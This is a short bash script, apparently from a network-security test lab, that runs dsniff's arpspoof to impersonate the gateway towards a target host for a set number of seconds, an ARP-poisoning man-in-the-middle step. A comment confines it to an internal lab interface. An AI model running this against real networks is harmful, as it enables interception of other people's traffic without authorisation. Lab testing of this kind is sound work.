#!/usr/bin/env bash
# Spoof the gateway's MAC towards TARGET for DURATION seconds, using dsniff's arpspoof.
# Lab-only: run solely on the internal interface shuntlab, never against a real network.
# Usage: TARGET=<ip> [GW=<ip>] [DURATION=20] ./arpspoof.sh
set -euo pipefail
. "$(dirname "$0")/common.sh"
need arpspoof; need_target
[[ -n $GW ]] || { echo "no gateway found on $IFACE, set GW=<ip>" >&2; exit 2; }
echo "spoofing $GW towards $TARGET on $IFACE for ${DURATION}s"
sudo timeout "$DURATION" arpspoof -i "$IFACE" -t "$TARGET" "$GW" || true
